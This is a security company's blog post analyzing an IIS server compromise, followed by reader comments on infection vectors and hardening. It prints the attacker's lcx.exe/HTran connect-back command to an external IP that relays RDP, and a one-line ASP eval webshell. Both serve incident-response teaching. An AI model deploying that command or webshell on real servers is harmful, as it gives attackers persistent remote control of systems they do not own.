<p>And for those that thought we only dabble in <a href="http://www.webopedia.com/TERM/L/LAMP.html">Linux Apache MySql PHP (LAMP)</a> stacks, well now you know.. ðŸ™‚</p>
<p>As is often the case, when we think of the how and the what attackers are set out to do once they penetrate our web server we stop short of the final step &#8211; maintaining control of the environment. This is perhaps the most critical, especially today where ownership of a <strong>slave</strong> box can fetch a great sum of money in the underground. </p>
<p><span id="more-10213"></span></p>
<figure id="attachment_10221" aria-describedby="caption-attachment-10221" style="width: 600px" class="wp-caption aligncenter"><a href="https://blog.sucuri.net/?attachment_id=10221" rel="lightbox"><img src="https://blog.sucuri.net/wp-content/uploads/2014/08/Sucuri-Anatomy-of-an-Website-Attack-600x264.png" alt="Sucuri - Anatomy of an Website Attack" width="600" height="264" class="size-medium wp-image-10221" /></a><figcaption id="caption-attachment-10221" class="wp-caption-text">Sucuri &#8211; Anatomy of Website Attack</figcaption></figure>
<p>These slave machines can be used to reinfect websites, bypassing existing access controls, and can add web servers to networks of other slave machines (otherwise known as zombie networks or botnets). These can be <a href="https://blog.sucuri.net/2014/03/understanding-denial-of-service-and-brute-force-attacks-wordpress-joomla-drupal-vbulletin.html">used for Brute Force and Denial of Service attacks</a> and a number of other nefarious acts. This is why when we talk about infections you will often refer to it as only 10% of the problem. Often, what you see, albeit bad and annoying, is usually not the real problem, it&#8217;s but a symptom of a bigger infection. </p>
<p>Such was this case.. </p>
<h5>The Windows Server</h5>
<p>If we take a step back in time, you might recall early 2013 &#8211; we refer to that as the period where web servers compromises were taking over. We were writing extensively on the latest <a href="https://blog.sucuri.net/2013/04/apache-binary-backdoors-on-cpanel-based-servers.html">Darkleech</a>, <a href="https://blog.sucuri.net/2014/03/windigo-linux-analysis-ebury-and-cdorked.html">Cdork and Ebury incidents</a>. I am not going to lie, as a researcher, this was a very exciting time for me and my team. Finally, attackers were showing a level of sophistication worthy of some in-depth analysis. </p>
<p>Needless to say, we didn&#8217;t spend much time on Windows Servers, IIS web servers, it&#8217;s not to say that they too were not being affected, but the impact just wasn&#8217;t as great. This should be a surprise though as IIS has been steadily losing market share with website owners over the past few years. That however does not mean it&#8217;s no longer utilized, it is. This case is an example of that. </p>
<p>In this case, we were faced with a challenging server issue where every site on the web server would get reinfected with spam, backdoors and other malware as quickly as it was cleaned. Yes, very very annoying&#8230; </p>
<h5>The Hunt Begins</h5>
<p>Our first instinct was that the server was suffering from cross-contamination and compromised FTP credentials. From this point, we knew we needed the client to do a full FTP credential reset to control the reinfections, but when they did, the reinfections just started up again like nothing had been done. What was happening here? </p>
<p>We restarted our investigation and began to fish for answers. </p>
<p>We suspected that either a vulnerable upload script or a compromised admin area credential had allowed the cross-contamination to restart and was causing the problem. However, as we dove deeper into the logs, the client messaged us to tell us that he had found and killed the suspicious process fixing the issue. Case closed, right?</p>
<p>Well, no. It wouldnâ€™t make a very good explanatory blog post if that was itâ€¦.</p>
<p>Within hours, the reinfections came back with a vengence. Fortunately for the client, we were still analyzing the logs when it returned. You see when it&#8217;s something interesting we have a bad case of OCD where we want to better understand what happened. In general, we love it when weâ€™re surprised by complexities within malware and are interested in learning as much as we can about the offending code. Contrary to popular belief, we&#8217;re not perfect. </p>
<p>In the analysis we decided to take a peak at the offending processor. We had to better understand what it was doing. </p>
<figure id="attachment_10226" aria-describedby="caption-attachment-10226" style="width: 600px" class="wp-caption aligncenter"><a href="https://blog.sucuri.net/?attachment_id=10226" rel="lightbox"><img loading="lazy" src="https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-LCX-EXE-600x188.png" alt="Sucuri - Windows IIS Malicious Processor - LCX EXE" width="600" height="188" class="size-medium wp-image-10226" srcset="https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-LCX-EXE-600x188.png 600w, https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-LCX-EXE-560x176.png 560w, https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-LCX-EXE-768x241.png 768w, https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-LCX-EXE-650x204.png 650w, https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-LCX-EXE.png 823w" sizes="(max-width: 600px) 100vw, 600px" /></a><figcaption id="caption-attachment-10226" class="wp-caption-text">Sucuri &#8211; Windows IIS Malicious Processor &#8211; LCX EXE</figcaption></figure>
<p>As you can see with the Process Explorer screenshot above, an IIS process <strong>(w3wp.exe)</strong> started a Command shell <strong>(cmd.exe)</strong>, which was used to start the <strong>lcx.exe</strong> process. Based on the command line option, it seemed like this process was connecting back to the <strong>199.180.101.206 server</strong>. A quick search of the IP turned up numerous complaints across the interwebs about it&#8217;s use in bot networks and as the originating node of DDoS attacks. </p>
<p>Naturally this was a red flag and worthy of further sleuthing. As we continued to look into the process, more and more of the picture began to unfold before us and we started to see where we needed to look for more information (note: all identifying client data has been removed):</p>
<figure id="attachment_10225" aria-describedby="caption-attachment-10225" style="width: 596px" class="wp-caption aligncenter"><a href="https://blog.sucuri.net/?attachment_id=10225" rel="lightbox"><img loading="lazy" src="https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-CMD-EXE.png" alt="Sucuri - Windows IIS Malicious Processor - CMD EXE" width="596" height="580" class="size-full wp-image-10225" srcset="https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-CMD-EXE.png 596w, https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-CMD-EXE-560x545.png 560w" sizes="(max-width: 596px) 100vw, 596px" /></a><figcaption id="caption-attachment-10225" class="wp-caption-text">Sucuri &#8211; Windows IIS Malicious Processor &#8211; CMD EXE</figcaption></figure>
<p>To start, the command line and current directory were key to finding the backdoor used to start and maintain access to the server as well as where the files were located so we could remove them. If youâ€™re curious, the full command line was:</p>
<p><code><br />
"C:RECYCLERcmd.exe" /c "cd /d "D:InetpubUsersinfectedwebsitewwwrootscripts"&C:RECYCLER\lcx.exe -slave 199.180.101.206 1113 127.0.0.1 3389&echo [S]&cd&echo [E]"<br />
</code></p>
<p>After reviewing all of the files inside the script directory, we found this piece of code spread out inside of an asp file:</p>
<p><code><br />
<% Dim ConKey:ConKey="700" Dim InValue:InValue=Request(ConKey) eval(InValue) %><br />
</code></p>
<p>Thatâ€™s simple enough, right? The injected file wouldn&#8217;t be any better. After checking the access logs, it became clear that it received several valid POST requests throughout the day, making it harder to identify any single suspicious entry.</p>
<p>Let&#8217;s go back to the <strong>lcx.exe</strong> process for a second. The client had an AntiVirus running and we downloaded a couple extra stand-alone scanners to check for suspicious files to make sure that they were all coming up clean. We also leveraged <a href="https://www.virustotal.com/">VirusTotal</a> and this is what they confirmed. </p>
<figure id="attachment_10224" aria-describedby="caption-attachment-10224" style="width: 600px" class="wp-caption aligncenter"><a href="https://blog.sucuri.net/?attachment_id=10224" rel="attachment_10224"><img loading="lazy" src="https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Winwos-IIS-Malicious-Processor-VirusTotal-600x352.png" alt="Sucuri - Winwos IIS Malicious Processor - VirusTotal Confirmation" width="600" height="352" class="size-medium wp-image-10224" /></a><figcaption id="caption-attachment-10224" class="wp-caption-text">Sucuri &#8211; Winwos IIS Malicious Processor &#8211; VirusTotal Confirmation</figcaption></figure>
<p>For you astute reader, you probably caught my mention earlier of the processor being stopped, yet the server being reinfected. If you did, then you&#8217;re likely asking yourself, &#8220;Hold up Fio, if they stopped it, yet they were still reinfected, how was it the processor leading to the reinfection?&#8221; </p>
<p>I&#8217;m so glad you asked..</p>
<p>You see, once you identify the infection you have to take it to the next step and understand the order of events. In this scenario, the key was to first kill the process, then remove the backdoors. Doing it in reverse would lead you into an endless circle. Stopping the processor, but leaving the backdoors would allow the attacker to regain entry and reinfect the server. Leaving the processor and removing the backdoor would just reinfect the server with more backdoors. </p>
<p>Once it was cleared in the right order, like magic, the reinfections stopped. Thank goodness I would say!</p>
<h5>Understanding the Attack</h5>
<p>After checking these files against our database, we can see that the file is the <strong>HUC Packet Transmit Tool V1.00</strong>, which is a Chinese connect-back backdoor also known as <strong>HTran</strong>. It was <a href="http://www.darkreading.com/vulnerabilities---threats/advanced-persistent-threats-the-new-reality/d/d-id/1139716?">listed as an <strong>Advanced Persistent Threat (APT)</strong></a>, but since it was easy to get rid of once detected I don&#8217;t necessarily believe in its persistence. ðŸ™‚</p>
<p>The malware was configured on slave mode (it can be set to listen, transmit packages or connect-back) and it allowed the attacker to have full access to the infected server.</p>
<figure id="attachment_10228" aria-describedby="caption-attachment-10228" style="width: 600px" class="wp-caption aligncenter"><a href="https://blog.sucuri.net/?attachment_id=10228" rel="lightbox"><img loading="lazy" src="https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-CMD-EXE-Options-600x296.png" alt="Sucuri - Windows IIS Malicious Processor - CMD EXE Options" width="600" height="296" class="size-medium wp-image-10228" srcset="https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-CMD-EXE-Options-600x296.png 600w, https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-CMD-EXE-Options-560x277.png 560w, https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-CMD-EXE-Options-650x321.png 650w, https://blog.sucuri.net/wp-content/uploads/2014/09/Sucuri-Windows-IIS-Malicious-Processor-CMD-EXE-Options.png 674w" sizes="(max-width: 600px) 100vw, 600px" /></a><figcaption id="caption-attachment-10228" class="wp-caption-text">Sucuri &#8211; Windows IIS Malicious Processor &#8211; CMD EXE Options</figcaption></figure>
<p>There are two main takeaways here. </p>
<p>First, itâ€™s important to remember that attackers make more money when they have more websites and web servers infected so they will always be trying to find ways into your site. </p>
<p>Second, itâ€™s always easier to attack the attackers when we work together so, if youâ€™re facing a malware or reinfection issue and <a href="http://sucuri.net/website-antirvirus-signup">you canâ€™t figure out how to clean your site or web server, contact us</a>. </p>
<aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2014%2F09%2Fmicrosof-iis-web-server-cmd-process-contributing-to-website-reinfections.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Microsoft%20IIS%20Web%20Server%20%E2%80%93%20CMD%20Process%20Contributing%20to%20Website%20Reinfections&url=https://blog.sucuri.net/2014/09/microsof-iis-web-server-cmd-process-contributing-to-website-reinfections.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--></div><footer class="entry-footer"><p class="entry-meta"><span class="entry-categories">Categories: <a href="https://blog.sucuri.net/category/website-malware-infections" rel="category tag">Website Malware Infections</a>, <a href="https://blog.sucuri.net/category/website-security" rel="category tag">Website Security</a></span><span class="entry-tags">Tags: <a href="https://blog.sucuri.net/tag/server-security" rel="tag">Server Security</a>, <a href="https://blog.sucuri.net/tag/webserver-infections" rel="tag">Webserver Infections</a>, <a href="https://blog.sucuri.net/tag/website-backdoor" rel="tag">Website Backdoor</a></span></p></footer></article><section class="author-box"><img alt='' src='https://secure.gravatar.com/avatar/dd94a7718ef2a64defe8a5a8b75aaae1?s=115&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/dd94a7718ef2a64defe8a5a8b75aaae1?s=230&#038;d=mm&#038;r=g 2x' class='avatar avatar-115 photo' height='115' width='115' loading='lazy'/><h4 class="author-box-title">About <span itemprop="name">Fioravante Souza</span></h4><div class="author-box-content" itemprop="description"><p>Fioravante "Fio" Souza is Sucuriâ€™s Vulnerability Research &amp; Machine Learning Manager who joined the company in 2012. Fioâ€™s main responsibilities include dealing with emerging web threats. His professional experience covers 18 years of information security. When Fio isnâ€™t dealing with web threats, you might find him fermenting everything he can find. Connect with Fio on <a href="https://twitter.com/fiocavallari">Twitter</a> or <a href="https://untappd.com/user/Fiocavallari">Untappd</a>.</p>
</div></section><h2 class="screen-reader-text">Reader Interactions</h2><div class="entry-comments" id="comments"><h3>Comments</h3><ol class="comment-list">
	<li class="comment even thread-even depth-1" id="comment-3898">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.saotn.org/" class="comment-author-link" rel="external nofollow" itemprop="url">JanR</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2014-09-10T04:31:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2014/09/microsof-iis-web-server-cmd-process-contributing-to-website-reinfections.html#comment-3898">September 10, 2014</a></time></p>		</header>

		<div class="comment-content">
			
			<p>These types of hacks are as old as IIS. Therefor, never ever run a website under the NETWORK SERVICE user!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-3899">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/815861012b4351ddfd30d564cefc28d9?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/815861012b4351ddfd30d564cefc28d9?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Michael Starks</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2014-09-10T12:19:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2014/09/microsof-iis-web-server-cmd-process-contributing-to-website-reinfections.html#comment-3899">September 10, 2014</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Nice write-up. From the sounds of things, a tight egress firewall policy would have helped. Not many people realize this, but a web server does not generally need outbound access on ports 80, 443, etc. This prevents connections initiated by the web server to the bad guys.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-3900">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/357a20e8c56e69d6f9734d23ef9517e8?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/357a20e8c56e69d6f9734d23ef9517e8?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">JanG</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2014-09-11T05:22:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2014/09/microsof-iis-web-server-cmd-process-contributing-to-website-reinfections.html#comment-3900">September 11, 2014</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Nice article, but I am missing the part were you describe the initial infection vector. How were the files (cmd.exe, lcx.exe) transferred to the recycler folder and executed? Was it a vulnerability of the IIS Server or of an application running on the server? Or via the FTP server or whatever. Thx.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-3901">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.saotn.org/" class="comment-author-link" rel="external nofollow" itemprop="url">JanR</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2014-09-11T06:04:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2014/09/microsof-iis-web-server-cmd-process-contributing-to-website-reinfections.html#comment-3901">September 11, 2014</a></time></p>		</header>

		<div class="comment-content">
			
			<p>From my experience, the infection vector is mostly a vulnerability in a website (for example timthumb.php, different FCKeditor examples left in the website, or custom upload scripts). Those are used to upload .asp, .aspx and .php backdoors to the website. Once the backdoor(s) is (are) in place, *and* NTFS file permissions are badly configured, executables are uploaded to various locations and executed.</p>
<p>But don&#8217;t forget: it&#8217;s very (very) hard to let an executable actually do something. When application pools run under a privileged IUSR account, the executable mostly just runs an does nothing. It&#8217;s in a zombie kind of state. It is very annoying because it may drain system resources to where a server is just no longer available. When an application pool runs with privileged permissions, like NETWORK SERVICE, there&#8217;s no telling what it can do, even adding local users and administrators&#8230;</p>
<p>This post states:<br />
&#8212;<br />
In this case, we were faced with a challenging server issue where every site on the web server would get reinfected with spam, backdoors and other malware as quickly as it was cleaned. Yes, very very annoyingâ€¦<br />
&#8212;</p>
<p>from what I can tell, in my experience, is that application pools and websites are set up wrong. All running under a privileged NETWORK SERVICE account (see my earlier comment). The user under which an appPool/website runs, often needs modify permissions on the website&#8217;s directory for certain tasks like uploading files or opening Access databases. When NTFS permissons are set up wrong, it gives an attacker write access to all websites in, in this case, D:InetpubUsers.</p>
<p>@fioravantesouza:disqus: the cmd.exe is one from Windows XP/2003. The web server is Windows 2003 / IIS 6.0? If yes, configure appPool identities to run under anonymous, less privileged, IUSR accounts. That&#8217;ll limit the attack vectors a bit.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-3902">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/65a18184a2af91ed1608428cbdf111b5?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/65a18184a2af91ed1608428cbdf111b5?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Gregory Suvalian</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2014-09-30T13:35:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2014/09/microsof-iis-web-server-cmd-process-contributing-to-website-reinfections.html#comment-3902">September 30, 2014</a></time></p>		</header>

		<div class="comment-content">
			
			<p>So where is information how initial infection happened? Also what does ASP code does which was posted, looks like initialized couple of variables and that&#8217;s it.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ol></div></main><aside class="sidebar sidebar-primary widget-area" role="complementary" aria-label="Primary Sidebar" itemscope itemtype="https://schema.org/WPSideBar" id="genesis-sidebar-primary"><h2 class="genesis-sidebar-title screen-reader-text">Primary Sidebar</h2><div class="sidebar-primary-wrap"><section id="text-5" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Socialize With Sucuri</h3>
			<div class="textwidget"><p>We're actively engaged across multiple platforms. Follow us and let's connect!</p>
<ul class="social-icons">
<li><a target="_blank" href="https://www.facebook.com/SucuriSecurity" rel="noopener"><span class="screen-reader-text">Facebook</span></a></li>
<li><a target="_blank" href="https://twitter.com/sucurisecurity" rel="noopener"><span class="screen-reader-text">Twitter</span></a></li>
<li><a target="_blank" href="https://www.linkedin.com/company/sucuri-security" rel="noopener"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a target="_blank" href="https://www.youtube.com/c/sucurinet" rel="noopener"><span class="screen-reader-text">YouTube</span></a></li>
<li><a target="_blank" href="https://www.instagram.com/sucurisecurity/" rel="noopener"><span class="screen-reader-text">Instagram</span></a></li>
<li><a target="_blank" href="https://blog.sucuri.net/feed/" rel="noopener"><span class="screen-reader-text">RSS Feed</span></a></li>
</ul>
</div>
		</div></section>
<section id="search-3" class="widget widget_search"><div class="widget-wrap"><form class="search-form" method="get" action="https://blog.sucuri.net/"><label class="search-form-label screen-reader-text" for="searchform-62ea51dc137d7">Search the blog</label><input type="search" name="s" id="searchform-62ea51dc137d7" placeholder="Search the blog" /><input type="submit" value="Search" /></form></div></section>
<section id="text-14" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/anatomy-of-website-malware?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Webinar&amp;utm_term=EN&amp;utm_content=Anatomy-of-Malware" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23220 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_anatomy-of-website-malware.png" alt="The Anatomy of Website Malware Webinar" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-37" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"></div>
		</div></section>
</div><div class="sidebar-cta-widget" id="sidebar-cta"><section id="text-6" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Join Over 20,000 Subscribers!</h3>
			<div class="textwidget"><p><a href="http://sucuri.hs-sites.com/subscribe-to-security" onClick="ga('send', 'event', 'Blog', 'Button_Click', 'Subscribe_to_Security_Newsletter');"><img src="https://blog.sucuri.net/wp-content/uploads/2017/09/17-EN-sucuri-blog-newsletter-banner.png" /></a></p>
</div>
		</div></section>
</div></aside></div></div></div><footer class="site-footer" itemscope itemtype="https://schema.org/WPFooter"><div class="footer-widgets" id="genesis-footer-widgets"><h2 class="genesis-sidebar-title screen-reader-text">Footer</h2><div class="wrap"><div class="widget-area footer-widgets-1 footer-widget-area"><section id="nav_menu-3" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Products</h3>
<div class="menu-footer-products-menu-container"><ul id="menu-footer-products-menu" class="menu"><li id="menu-item-15501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15501"><a href="https://sucuri.net/website-firewall/" itemprop="url">Website Firewall</a></li>
<li id="menu-item-15502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15502"><a href="https://sucuri.net/website-antivirus/" itemprop="url">Website AntiVirus</a></li>
<li id="menu-item-15503" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15503"><a href="https://sucuri.net/website-backups/" itemprop="url">Website Backups</a></li>
<li id="menu-item-15504" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15504"><a href="https://sucuri.net/wordpress-security/" itemprop="url">WordPress Security</a></li>
<li id="menu-item-15505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15505"><a href="https://sucuri.net/custom/enterprise/" itemprop="url">Enterprise Services</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-2 footer-widget-area"><section id="nav_menu-4" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Solutions</h3>
<div class="menu-footer-solutions-menu-container"><ul id="menu-footer-solutions-menu" class="menu"><li id="menu-item-15506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15506"><a href="https://sucuri.net/website-firewall/ddos-protection" itemprop="url">DDos Protection</a></li>
<li id="menu-item-15507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15507"><a href="https://sucuri.net/website-antivirus/malware-scanning-and-detection" itemprop="url">Malware Detection</a></li>
<li id="menu-item-15508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15508"><a href="https://sucuri.net/website-antivirus/malware-removal" itemprop="url">Malware Removal</a></li>
<li id="menu-item-15510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15510"><a href="https://sucuri.net/website-firewall/stop-website-attacks-and-hacks" itemprop="url">Malware Prevention</a></li>
<li id="menu-item-15511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15511"><a href="https://sucuri.net/website-antivirus/blacklist-removal-and-repair" itemprop="url">Blacklist Removal</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-3 footer-widget-area"><section id="nav_menu-6" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Support</h3>
<div class="menu-footer-support-menu-container"><ul id="menu-footer-support-menu" class="menu"><li id="menu-item-15512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15512"><a href="https://blog.sucuri.net/" itemprop="url">Blog</a></li>
<li id="menu-item-15513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15513"><a href="https://kb.sucuri.net/" itemprop="url">Knowledge Base</a></li>
<li id="menu-item-15515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15515"><a href="https://sitecheck.sucuri.net/" itemprop="url">SiteCheck</a></li>
<li id="menu-item-15516" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15516"><a href="http://labs.sucuri.net/" itemprop="url">Research Labs</a></li>
<li id="menu-item-15517" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15517"><a href="https://sucuri.net/faq/" itemprop="url">FAQ</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-4 footer-widget-area"><section id="nav_menu-5" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Company</h3>
<div class="menu-footer-company-menu-container"><ul id="menu-footer-company-menu" class="menu"><li id="menu-item-15495" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15495"><a href="https://sucuri.net/company/" itemprop="url">About</a></li>
<li id="menu-item-15496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15496"><a href="https://sucuri.net/company/media" itemprop="url">Media</a></li>
<li id="menu-item-15497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15497"><a href="https://sucuri.net/company/events" itemprop="url">Events</a></li>
<li id="menu-item-15498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15498"><a href="https://sucuri.net/company/employment/" itemprop="url">Employment</a></li>
<li id="menu-item-15499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15499"><a href="https://sucuri.net/company/contact-us" itemprop="url">Contact</a></li>
<li id="menu-item-15500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15500"><a href="https://sucuri.net/customers/" itemprop="url">Testimonials</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-5 footer-widget-area"><section id="text-4" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><ul class="social-icons">
<li><a href="https://www.facebook.com/SucuriSecurity"><span class="screen-reader-text">Facebook</span></a></li>
<li><a href="https://twitter.com/sucurisecurity"><span class="screen-reader-text">Twitter</span></a></li>
<li><a href="https://www.linkedin.com/company/sucuri-security"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a href="https://www.instagram.com/sucurisecurity/"><span class="screen-reader-text">Instagram</span></a></li>
</ul>
<p><a class="button" href="https://dashboard.sucuri.net/login/">Customer Login</a></p>
<p><a class="footer-logo" href="https://sucuri.net/">Sucuri Home</a></p>
</div>
		</div></section>
</div></div></div><div class="site-footer-widget"><div class="wrap"><section id="text-8" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><div class="site-footer-links">
<ul>
<li><a href="https://sucuri.net/terms">Terms of Use</a></li>
<li><a href="https://sucuri.net/privacy">Privacy Policy</a></li>
<li><a href="https://sucuri.net/faq/">Frequently Asked Questions</a></li>
</ul>
</div>
<div class="site-footer-copyright">
<p>&#x000A9;&nbsp;2022 Sucuri Inc. All rights reserved</p>
</div>
</div>
		</div></section>
</div></div></footer></div><script type="text/javascript">
ire('identify', {customerId: 'â€‹â€‹', customerEmail: 'â€‹â€‹'}); </script><div id="cookie-policy-banner" class="container-fluid cookie-policy-banner hide p-0">
        <div class="container">
            <button id="cookie-policy-decline-btn" class="cb-close cb-decline-anchor">X</button>
            <div class="row">
                <div class="c-lg-8">
                    <p class="mb-0 mt-0 highlight green heavy">Sucuri Cookie Policy <br> <a href="https://sucuri.net/cookies" target="_blank" class="bolder no-underline">See our policy>></a></p>
                    <p class="mb-0 mt-0">Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.</p>
                </div>
                <div class="c-lg-4 d-flex justify-items-start mt-15 align-items-center">
                    <button id="cookie-policy-btn" class="btn btn-primary ml-0">Accept</button>
                    <button class="btn cb-decline-anchor auto-track" data-gatrack="Cookie_Click, Decline">Decline</button>
                    <button id="manage-privacy-options" class="btn">Manage Options</button>
                </div>
            </div>
        </div>
    </div><script type="text/javascript">
		/* MonsterInsights Scroll Tracking */
			if ( typeof(jQuery) !== 'undefined' ) {
				jQuery( document ).ready(function(){
					function monsterinsights_scroll_tracking_load() {
						if ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) {
							(function(factory) {
								factory(jQuery);
							}(function($) {

								/* Scroll Depth */
								"use strict";
								var defaults = {
									percentage: true
								};

								var $window = $(window),
									cache = [],
									scrollEventBound = false,
									lastPixelDepth = 0;

								/*
								 * Plugin
								 */

								$.scrollDepth = function(options) {

									var startTime = +new Date();

									options = $.extend({}, defaults, options);

									/*
									 * Functions
									 */

									function sendEvent(action, label, scrollDistance, timing) {

										var fieldsArray = {
											hitType       : 'event',
											eventCategory : 'Scroll Depth',
											eventAction   : action,
											eventLabel    : label,
											eventValue    : 1,
											nonInteraction: 1
										};

										if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
											return;
										}

